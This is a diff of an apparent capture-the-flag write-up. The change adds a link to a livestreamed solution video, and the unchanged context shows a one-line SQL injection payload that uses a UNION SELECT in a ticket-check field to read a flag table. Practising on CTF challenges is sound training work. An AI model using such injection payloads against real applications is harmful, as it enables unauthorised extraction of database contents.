@@ -18,3 +18,7 @@ Check it out at: URL
 
 Check ticket -> `' UNION SELECT 1,(SELECT flag FROM flag),2,3; #`
 
+## Lösning på livestream
+
+https://www.youtube.com/watch?v=CYBGQ9Zp6UQ&t=2365s
+
